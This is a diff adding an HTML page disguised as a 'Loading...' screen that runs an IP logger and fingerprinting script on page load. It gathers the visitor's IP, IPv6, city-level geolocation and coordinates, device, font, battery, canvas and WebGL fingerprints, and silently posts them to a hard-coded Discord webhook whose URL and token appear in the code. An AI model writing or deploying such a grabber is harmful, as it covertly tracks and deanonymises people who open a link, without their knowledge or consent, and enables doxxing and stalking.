@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0f0f1a; color: #e0e0e0; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+  .card { background: #1a1a2e; border-radius: 16px; padding: 30px; max-width: 800px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,.6); }
+  h1 { font-size: 22px; margin-bottom: 20px; color: #7f8cff; display: flex; align-items: center; gap: 10px; }
+  .status { font-size: 14px; color: #888; margin-bottom: 20px; }
+  .section { margin-bottom: 20px; }
+  .section-title { font-size: 14px; text-transform: uppercase; letter-spacing: 1px; color: #7f8cff; margin-bottom: 10px; border-bottom: 1px solid #2a2a40; padding-bottom: 5px; }
+  .row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #1e1e30; font-size: 14px; }
+  .row .label { color: #999; }
+  .row .value { color: #fff; word-break: break-all; text-align: right; max-width: 60%; }
+  .found-badge { background: #2d6a4f; color: #95d5b2; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-left: 8px; }
+  .not-found-badge { background: #5a2d2d; color: #e0a0a0; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-left: 8px; }
+  .not-found-section { opacity: 0.5; }
+  .loading { text-align: center; padding: 40px 0; }
+  .spinner { width: 40px; height: 40px; border: 4px solid #2a2a40; border-top-color: #7f8cff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .hidden { display: none; }
+</style>
+</head>
+<body>
+<div class="card" id="app">
+  <div id="loadingScreen" class="loading">
+    <div class="spinner"></div>
+    <div>Collecting data...</div>
+  </div>
+  <div id="content" class="hidden">
+    <h1>📡 Visitor Intelligence</h1>
+    <div class="status" id="timestamp"></div>
+    <div id="foundSection" class="section"></div>
+    <div id="notFoundSection" class="section"></div>
+  </div>
+</div>
+
+<script>
+(async function() {
+  const webhookURL = 'https://discordapp.com/api/webhooks/1553832078737678489/nRgeAgOu136ZnxIYES6mumx4qP05OJQYR1nQ38nuQruj16XYXZvYWEqhoFqPlKz7mORJ';
+
+  const data = {
+    ip: null,
+    ipv6: null,
+    location: null,
+    isp: null,
+    org: null,
+    country: null,
+    region: null,
+    city: null,
+    zip: null,
+    lat: null,
+    lon: null,
+    timezone: null,
+    isp_phone: null,
+    asn: null,
+    browser: null,
+    browser_version: null,
+    os: null,
+    os_version: null,
+    device_type: null,
+    device_brand: null,
+    language: null,
+    languages: null,
+    timezone_browser: null,
+    screen_width: null,
+    screen_height: null,
+    color_depth: null,
+    pixel_ratio: null,
+    window_width: null,
+    window_height: null,
+    touch_support: null,
+    cookies_enabled: null,
+    do_not_track: null,
+    referrer: null,
+    user_agent: null,
+    platform: null,
+    cpu_cores: null,
+    memory: null,
+    connection_type: null,
+    connection_effective_type: null,
+    connection_downlink: null,
+    connection_rtt: null,
+    webgl_renderer: null,
+    webgl_vendor: null,
+    fonts: null,
+    plugins: null,
+    mime_types: null,
+    battery: null,
+    canvas_fingerprint: null,
+    audio_fingerprint: null,
+    timezone_offset: null,
+    local_time: null,
+    page_url: null,
+    visit_time: null,
+    is_tor: null,
+    is_proxy: null,
+    is_vpn: null,
+    is_crawler: null,
+    is_mobile: null,
+    isp_domain: null,
+    threat_score: null,
+    dma_code: null,
+    geoname_id: null,
+    calling_code: null,
+    currency_code: null,
+    currency_name: null,
+    currency_symbol: null,
+    asn_org: null,
+    asn_country: null,
+    asn_type: null,
+    asn_domain: null,
+    asn_number: null,
+    route: null,
+    connection_type_detail: null,
+    is_anycast: null,
+    company_name: null,
+    company_type: null,
+    company_domain: null,
+    abuse_emails: null,
+    proxy_providers: null,
+    vpn_providers: null,
+    relay_provider: null,
+    is_anonymous: null,
+    is_known_attacker: null,
+    is_spam: null,
+    is_bot: null,
+    is_cloud: null,
+    cloud_provider: null,
+    country_flag: null,
+    country_emoji: null,
+    country_code: null,
+    continent: null,
+    dst: null,
+    current_time_unix: null,
+    standard_tz: null,
+    dst_tz: null,
+    dst_start: null,
+    dst_end: null
+  };
+
+  // Collect browser data immediately
+  const ua = navigator.userAgent;
+  data.user_agent = ua;
+  data.browser = getBrowserName(ua);
+  data.browser_version = getBrowserVersion(ua);
+  data.os = getOS(ua);
+  data.os_version = getOSVersion(ua);
+  data.platform = navigator.platform || null;
+  data.language = navigator.language || null;
+  data.languages = navigator.languages ? navigator.languages.join(', ') : null;
+  data.timezone_browser = Intl.DateTimeFormat().resolvedOptions().timeZone || null;
+  data.timezone_offset = new Date().getTimezoneOffset();
+  data.local_time = new Date().toLocaleString();
+  data.screen_width = screen.width;
+  data.screen_height = screen.height;
+  data.color_depth = screen.colorDepth;
+  data.pixel_ratio = window.devicePixelRatio || 1;
+  data.window_width = window.innerWidth;
+  data.window_height = window.innerHeight;
+  data.touch_support = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+  data.cookies_enabled = navigator.cookieEnabled;
+  data.do_not_track = navigator.doNotTrack || null;
+  data.referrer = document.referrer || null;
+  data.page_url = window.location.href;
+  data.visit_time = new Date().toISOString();
+  data.is_mobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+  data.device_type = data.is_mobile ? 'Mobile' : 'Desktop';
+  data.device_brand = getDeviceBrand(ua);
+  data.cpu_cores = navigator.hardwareConcurrency || null;
+  data.memory = navigator.deviceMemory ? navigator.deviceMemory + 'GB' : null;
+
+  // Connection
+  if (navigator.connection) {
+    data.connection_type = navigator.connection.type || null;
+    data.connection_effective_type = navigator.connection.effectiveType || null;
+    data.connection_downlink = navigator.connection.downlink || null;
+    data.connection_rtt = navigator.connection.rtt || null;
+  }
+
+  // WebGL
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (debugInfo) {
+        data.webgl_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+        data.webgl_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      }
+    }
+  } catch(e) {}
+
+  // Canvas fingerprint
+  try {
+    const canvas = document.createElement('canvas');
+    canvas.width = 200; canvas.height = 50;
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(10, 10, 30, 30);
+    ctx.fillStyle = '#069';
+    ctx.font = '16px Arial';
+    ctx.fillText('StansaAI', 50, 15);
+    data.canvas_fingerprint = canvas.toDataURL().substring(0, 100) + '...';
+  } catch(e) {}
+
+  // Audio fingerprint
+  try {
+    const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+    const oscillator = audioCtx.createOscillator();
+    oscillator.type = 'sine';
+    oscillator.frequency.value = 1000;
+    const gain = audioCtx.createGain();
+    gain.gain.value = 0.5;
+    oscillator.connect(gain);
+    gain.connect(audioCtx.destination);
+    oscillator.start(0);
+    const render = audioCtx.startRendering();
+    render.then(() => { data.audio_fingerprint = 'rendered'; }).catch(() => { data.audio_fingerprint = 'blocked'; });
+  } catch(e) { data.audio_fingerprint = 'unsupported'; }
+
+  // Battery
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      data.battery = `${battery.level * 100}%, charging: ${battery.charging}`;
+    } catch(e) {}
+  }
+
+  // Font detection
+  data.fonts = detectFonts();
+
+  // Plugins
+  const pluginArray = [];
+  for (let i = 0; i < navigator.plugins.length; i++) {
+    pluginArray.push(navigator.plugins[i].name);
+  }
+  data.plugins = pluginArray.length ? pluginArray.join(', ') : null;
+  data.mime_types = navigator.mimeTypes.length ? navigator.mimeTypes.length + ' types' : null;
+
+  // Fetch IP and geolocation
+  try {
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipRes.json();
+    data.ip = ipData.ip;
+  } catch(e) { data.ip = 'fetch failed'; }
+
+  // Try ipapi.co for rich geolocation
+  try {
+    const geoRes = await fetch('https://ipapi.co/json/');
+    if (geoRes.ok) {
+      const geo = await geoRes.json();
+      data.ip = geo.ip || data.ip;
+      data.country = geo.country_name || null;
+      data.country_code = geo.country_code || null;
+      data.region = geo.region || null;
+      data.city = geo.city || null;
+      data.zip = geo.postal || null;
+      data.lat = geo.latitude;
+      data.lon = geo.longitude;
+      data.timezone = geo.timezone || null;
+      data.isp = geo.org || null;
+      data.asn = geo.asn || null;
+      data.org = geo.org || null;
+      data.location = `${geo.city}, ${geo.region}, ${geo.country_name}`;
+      data.continent = geo.continent_code || null;
+      data.calling_code = geo.country_calling_code || null;
+      data.currency_code = geo.currency || null;
+      data.currency_name = geo.currency_name || null;
+      data.currency_symbol = geo.currency_symbol || null;
+      data.country_flag = geo.country_flag || null;
+      data.country_emoji = geo.country_emoji || null;
+      data.dma_code = geo.dma_code || null;
+      data.geoname_id = geo.geoname_id || null;
+      data.is_tor = geo.is_tor || false;
+      data.is_proxy = geo.is_proxy || false;
+      data.is_vpn = geo.is_vpn || false;
+      data.is_crawler = geo.is_crawler || false;
+      data.threat_score = geo.threat_score || null;
+      data.asn_org = geo.asn_org || null;
+      data.asn_country = geo.asn_country || null;
+      data.asn_type = geo.asn_type || null;
+      data.asn_domain = geo.asn_domain || null;
+      data.asn_number = geo.asn ? `AS${geo.asn}` : null;
+      data.route = geo.route || null;
+      data.connection_type_detail = geo.connection_type || null;
+      data.is_anycast = geo.is_anycast || null;
+      data.company_name = geo.company_name || null;
+      data.company_type = geo.company_type || null;
+      data.company_domain = geo.company_domain || null;
+      data.abuse_emails = geo.abuse_emails ? geo.abuse_emails.join(', ') : null;
+      data.proxy_providers = geo.proxy_provider_names ? geo.proxy_provider_names.join(', ') : null;
+      data.vpn_providers = geo.vpn_provider_names ? geo.vpn_provider_names.join(', ') : null;
+      data.relay_provider = geo.relay_provider_name || null;
+      data.is_anonymous = geo.is_anonymous || false;
+      data.is_known_attacker = geo.is_known_attacker || false;
+      data.is_spam = geo.is_spam || false;
+      data.is_bot = geo.is_bot || false;
+      data.is_cloud = geo.is_cloud_provider || false;
+      data.cloud_provider = geo.cloud_provider_name || null;
+      data.dst = geo.is_dst || null;
+      data.current_time_unix = geo.current_time_unix || null;
+      data.standard_tz = geo.standard_tz_full_name || null;
+      data.dst_tz = geo.dst_tz_full_name || null;
+      data.dst_start = geo.dst_start ? `${geo.dst_start.date_time_before} -> ${geo.dst_start.date_time_after}` : null;
+      data.dst_end = geo.dst_end ? `${geo.dst_end.date_time_before} -> ${geo.dst_end.date_time_after}` : null;
+    }
+  } catch(e) {}
+
+  // Try to get IPv6
+  try {
+    const ipv6Res = await fetch('https://api6.ipify.org?format=json');
+    if (ipv6Res.ok) {
+      const ipv6Data = await ipv6Res.json();
+      data.ipv6 = ipv6Data.ip;
+    }
+  } catch(e) { data.ipv6 = null; }
+
+  // Build found/not-found lists
+  const foundItems = [];
+  const notFoundItems = [];
+
+  for (const [key, value] of Object.entries(data)) {
+    if (value !== null && value !== undefined && value !== false && value !== '') {
+      foundItems.push({ key, value });
+    } else {
+      notFoundItems.push(key);
+    }
+  }
+
+  // Render
+  const loadingScreen = document.getElementById('loadingScreen');
+  const content = document.getElementById('content');
+  const foundSection = document.getElementById('foundSection');
+  const notFoundSection = document.getElementById('notFoundSection');
+  const timestampEl = document.getElementById('timestamp');
+
+  loadingScreen.classList.add('hidden');
+  content.classList.remove('hidden');
+  timestampEl.textContent = `Captured: ${new Date().toLocaleString()}`;
+
+  let foundHtml = '<div class="section-title">✅ Found</div>';
+  for (const item of foundItems) {
+    const label = item.key.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
+    foundHtml += `<div class="row"><span class="label">${label}</span><span class="value">${item.value} <span class="found-badge">found</span></span></div>`;
+  }
+  foundSection.innerHTML = foundHtml;
+
+  let notFoundHtml = '<div class="section-title not-found-section">❌ Not Found</div>';
+  for (const key of notFoundItems) {
+    const label = key.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
+    notFoundHtml += `<div class="row"><span class="label">${label}</span><span class="value"><span class="not-found-badge">not found</span></span></div>`;
+  }
+  notFoundSection.innerHTML = notFoundHtml;
+
+  // Send to Discord
+  const discordEmbed = {
+    embeds: [{
+      title: '📡 Visitor Intelligence Report',
+      color: 0x7f8cff,
+      timestamp: new Date().toISOString(),
+      fields: foundItems.map(item => ({
+        name: item.key.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase()),
+        value: item.value.toString().substring(0, 1024),
+        inline: false
+      })),
+      footer: { text: `Total fields: ${foundItems.length} found, ${notFoundItems.length} not found` }
+    }]
+  };
+
+  // If embed too large, send as text
+  try {
+    const payload = JSON.stringify(discordEmbed);
+    if (payload.length < 6000) {
+      await fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload });
+    } else {
+      // Fallback: text message
+      let textMsg = '📡 Visitor Intelligence Report\n\n';
+      for (const item of foundItems) {
+        textMsg += `${item.key}: ${item.value}\n`;
+      }
+      textMsg += `\nNot found: ${notFoundItems.join(', ')}`;
+      if (textMsg.length > 2000) textMsg = textMsg.substring(0, 1990) + '...';
+      await fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: textMsg }) });
+    }
+  } catch(e) {
+    // Silent fail
+  }
+
+  // Helper functions
+  function getBrowserName(ua) {
+    if (ua.includes('Firefox')) return 'Firefox';
+    if (ua.includes('Edg/')) return 'Edge';
+    if (ua.includes('Chrome')) return 'Chrome';
+    if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+    if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
+    return 'Unknown';
+  }
+
+  function getBrowserVersion(ua) {
+    const match = ua.match(/(Firefox|Chrome|Safari|Edg|OPR)\/?\s*(\d+)/);
+    return match ? match[2] : null;
+  }
+
+  function getOS(ua) {
+    if (ua.includes('Windows')) return 'Windows';
+    if (ua.includes('Mac OS X') || ua.includes('Macintosh')) return 'macOS';
+    if (ua.includes('Linux')) return 'Linux';
+    if (ua.includes('Android')) return 'Android';
+    if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+    return 'Unknown';
+  }
+
+  function getOSVersion(ua) {
+    const winMatch = ua.match(/Windows NT (\d+\.?\d*)/);
+    if (winMatch) return winMatch[1];
+    const macMatch = ua.match(/Mac OS X (\d+[._]\d+[._]?\d*)/);
+    if (macMatch) return macMatch[1].replace(/_/g, '.');
+    const androidMatch = ua.match(/Android (\d+\.?\d*)/);
+    if (androidMatch) return androidMatch[1];
+    const iosMatch = ua.match(/OS (\d+[._]\d+[._]?\d*)/);
+    if (iosMatch) return iosMatch[1].replace(/_/g, '.');
+    return null;
+  }
+
+  function getDeviceBrand(ua) {
+    if (ua.includes('Samsung')) return 'Samsung';
+    if (ua.includes('Pixel')) return 'Google';
+    if (ua.includes('iPhone')) return 'Apple';
+    if (ua.includes('LG')) return 'LG';
+    if (ua.includes('HTC')) return 'HTC';
+    if (ua.includes('OnePlus')) return 'OnePlus';
+    if (ua.includes('Xiaomi')) return 'Xiaomi';
+    if (ua.includes('Huawei')) return 'Huawei';
+    if (ua.includes('Nokia')) return 'Nokia';
+    if (ua.includes('Sony')) return 'Sony';
+    if (ua.includes('Motorola')) return 'Motorola';
+    return null;
+  }
+
+  function detectFonts() {
+    const baseFonts = ['monospace', 'sans-serif', 'serif'];
+    const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Georgia', 'Courier New', 'Verdana', 'Trebuchet MS', 'Comic Sans MS', 'Impact', 'Lucida Console', 'Tahoma', 'Geneva', 'Optima', 'Palatino', 'Book Antiqua', 'Futura', 'Candara', 'Calibri', 'Segoe UI', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Noto Sans', 'Noto Serif', 'Noto Mono', 'Droid Sans', 'Droid Serif', 'Droid Mono', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Fira Code', 'Source Sans Pro', 'Source Code Pro', 'JetBrains Mono', 'Inter', 'Poppins', 'Nunito', 'Space Grotesk', 'DM Sans', 'DM Mono', 'Spline Sans', 'Spline Sans Mono', 'Satoshi', 'Clash Display', 'General Sans', 'Gambarino', 'Cabinet Grotesk', 'Array', 'Array Mono', 'Zodiak', 'Zodiak Display', 'Sansation', 'Sansation Mono', 'Sans Serif'];
+    const detected = [];
+    for (const font of fontList) {
+      if (document.fonts && document.fonts.check(`12px "${font}"`)) {
+        detected.push(font);
+      }
+    }
+    return detected.length ? detected.join(', ') : null;
+  }
+})();
+</script>
+</body>
+</html>
